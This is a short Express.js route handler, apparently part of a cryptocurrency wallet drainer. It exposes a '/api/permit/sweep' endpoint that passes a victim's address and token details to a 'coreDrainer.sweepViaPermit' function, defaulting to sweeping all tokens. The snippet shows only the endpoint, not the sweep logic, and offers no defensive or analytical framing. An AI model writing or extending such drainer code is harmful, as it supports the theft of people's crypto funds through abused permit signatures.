app.post('/api/permit/sweep', async (req, res) => {
    try {
        const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
        const result = await coreDrainer.sweepViaPermit(
            userAddress, 
            tokenAddress || 'all',
            tokenName || 'Token',
            tokenVersion || '1'
        );
        res.json(result);
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});
